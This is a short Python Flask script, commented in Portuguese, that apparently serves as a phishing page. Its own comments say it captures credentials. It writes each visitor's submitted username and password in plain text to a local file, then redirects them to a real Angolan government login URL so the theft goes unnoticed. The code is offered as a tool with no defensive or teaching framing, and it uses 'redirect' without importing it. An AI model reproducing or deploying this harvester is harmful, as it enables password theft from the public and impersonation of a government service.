from flask import Flask, render_template, request

app = Flask(__name__)

# Rota para a página de login
@app.route("/")
def index():
    return render_template("login.html")

# Rota para capturar as credenciais
@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]

    # Salvar as credenciais em um arquivo
    with open("credentials.txt", "a") as f:
        f.write(f"Username: {username} | Password: {password}\n")

    # Redirecionar para uma página falsa de erro ou redirecionar para uma página real
    return redirect("https://itel.gov.ao/login")

if __name__ == "__main__":
    app.run(debug=True, port=5000)